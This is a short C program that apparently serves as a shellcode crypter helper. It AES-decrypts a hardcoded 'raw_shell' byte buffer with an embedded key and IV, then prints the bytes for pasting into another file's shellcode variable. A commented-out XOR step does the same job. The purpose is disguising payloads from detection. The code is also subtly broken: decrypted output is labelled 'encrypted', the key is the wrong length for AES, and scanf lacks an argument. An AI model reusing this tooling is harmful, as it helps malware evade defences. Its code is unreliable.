#include <stdio.h>
#include "aes.h"
int main(int argc, char*argv[]) {
uint8_t raw_shell[] =  "\x2e\xfe\x72\x19\xe1\x48\xe3\x37\xb4\x37\x1f\x95\x84\xcc\xf4";
/*int i;
char key = '!';
printf("encrypted buffer\n");
for ( i = 0; i < sizeof(raw_shell); i++)
{
    printf("\\x%02x", raw_shell[i]^key);//xor encryption*/ 

// copy the encrypted shellcode to the shellcode variable in new.c file
struct AES_ctx ctx;
uint8_t key[] = "1@_2wa&^r4";
uint8_t  iv[] = "\x9d\x02\x35\x3b\xa3\x4b\xec\x26\x13\x88\x58\x51\x11\x47\xa5\x98";
AES_init_ctx_iv(&ctx, key, iv);
AES_CBC_decrypt_buffer(&ctx,raw_shell,sizeof(raw_shell));
printf("Encrypted buffer:\n");

	for (int i = 0; i < sizeof(raw_shell) - 1; i++) {
		printf("\\x%02x", raw_shell[i]);

	}
printf("\n");
printf("press any key");
scanf("%d");
}